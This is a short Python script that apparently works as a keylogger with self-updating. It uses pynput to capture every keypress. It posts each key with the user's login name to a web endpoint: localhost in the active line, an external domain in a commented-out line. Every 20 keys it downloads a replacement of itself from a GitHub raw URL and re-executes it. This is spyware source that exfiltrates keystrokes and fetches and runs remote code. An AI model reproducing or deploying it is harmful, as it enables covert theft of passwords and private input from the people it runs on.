__version__="0.1.0"

import sys,os
import contextlib
from pynput import keyboard
import getpass
import requests
import urllib
import urllib.request
import re
from subprocess import call

def update(dl_url, force_update=False):
    def compare_versions(vlocal, vremote):
        
        if vlocal == vremote: return 0
        
        def isfloat(s):
            try:
                float(s)
            except ValueError:
                return False
            return True
        
        vlocal=vlocal.replace('.','')
        vremote=vremote.replace('.','')
        
        if isfloat(vlocal) and isfloat(vremote):
            if float(vlocal) > float(vremote):
                return 1
            else:
                return -1
        else:
            print("lool %s und %s" % (str(vlocal),str(vremote)))
            return 0
        
    try:
        http_stream = urllib.request.urlopen(dl_url)
        update_file = http_stream.read(256)
        http_stream.close()
    except Exception as e:
        print(e)
        traceback.print_exc()
        return

    match_regex = re.search(r'__version__ *= *"(\S+)"', str(update_file))
    if not match_regex:
        print("No version info could be found")
        return
    update_version = match_regex.group(1)

    if not update_version:
        return

    if force_update:
        pass
    else:
        cmp_result = compare_versions(__version__, update_version)
        if cmp_result < 0:
            pass
        elif cmp_result > 0:
            return
        else:
            return

    app_path = os.path.realpath(sys.argv[0])

    if not os.access(app_path, os.W_OK):
        pass

    dl_path = app_path + ".new"
    backup_path = app_path + ".old"
    try:
        dl_file = open(dl_path, 'wb')
        http_stream = urllib.request.urlopen(dl_url)
        total_size = None
        bytes_so_far = 0
        chunk_size = 8192
        try:
            total_size = int(http_stream.info().get('Content-Length').strip())
        except:
            dl_file.write(http_stream.read())

        while total_size:
            chunk = http_stream.read(chunk_size)
            dl_file.write(chunk)
            bytes_so_far += len(chunk)

            if not chunk:
                break

            percent = float(bytes_so_far) / total_size
            percent = round(percent*100, 2)

            if bytes_so_far >= total_size:
                sys.stdout.write('\n')

        http_stream.close()
        dl_file.close()
    except Exception as e:
        return

    try:
        os.rename(app_path, backup_path)
    except Exception as e:
        return

    try:
        os.rename(dl_path, app_path)
    except Exception as e:
        return

    try:
        import shutil
        shutil.copymode(backup_path, app_path)
    except Exception as e:
        os.chmod(app_path, '0755')
    os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)
    return
    


counter=0
def on_press(key):
    global counter
    
    name=getpass.getuser()
    data = {"name": str(name), "key": str(key)}
    #r = requests.post("http://benedikt-schwering.de/WannaSToftware/keylog/index.php", data=data)  # this will make the method "POST"
    r = requests.post("http://localhost/WannaSToftware/keylog/index.php", data=data)  # this will make the method "POST"
    counter+=1
    if counter>20:
        counter=0
        update('https://github.com/boba2fett/ShitCollection/raw/master/logkey/k.py')


listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join() 

